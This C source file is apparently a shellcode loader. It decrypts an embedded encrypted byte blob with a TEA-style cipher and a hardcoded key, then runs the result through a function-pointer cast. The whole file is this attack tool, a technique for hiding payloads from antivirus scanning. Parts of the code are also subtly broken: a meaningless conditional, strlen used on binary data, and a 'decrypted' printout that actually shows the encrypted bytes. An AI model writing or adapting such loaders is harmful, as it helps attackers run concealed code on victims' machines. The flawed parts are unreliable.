#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void decode(long *data, long *key) {
	unsigned long n = 32, sum, y = data[0], z = data[1],
	delta=0x9e3779b9;
	sum = delta << 5;
	while (n-- > 0) {
	     	z -= (y << 4) + (key[2]^y) + (sum^(y >> 5)) + key[3]; 
	     	y -= (z << 4) + (key[0]^z) + (sum^(z >> 5)) + key[1];
	     	sum -= delta;  
	}
	data[0] = y; 
	data[1] = z;  
}

/* Character Array Functions */
void decodestr(char *datastr, char *keystr) {
	int i = 0, datasize;
	long *data = (long *)datastr;
	long *key = (long *)keystr;
	datasize = strlen(datastr) / sizeof(long);
	datasize = 0 ? 1 : datasize;
	while (i < datasize) {
		decode(data, key);
		i += 2;
		data = (long *)datastr + i;
	}
}

int main() {
	char shellcode[] = \
	"\x2a\xf4\x21\x3e\xb0\xfc\x99\xa4\xdb\xcc\xb7\x85\xe9\x64\x8d\xa9\x05\x9b\x37\x91\xa6\xdf\x83\x06\x80";	

	char buffer[512];
	char key[16] = "youAreMySunShine";
	
	strcpy(buffer, shellcode);
	decodestr(buffer, key);
	
	printf("Decrypted shellcode:\n");
	for (int i=0;i<strlen(shellcode);i++)
	{
		printf("\\x%02x", (unsigned char)(int)shellcode[i]);
	}

	// we are executing the shellcode once it has been decrypted
	printf("\nRunning shellcode...\n");
	int (*ret)() = (int(*)())buffer;
	ret();
	
	return 0;
}
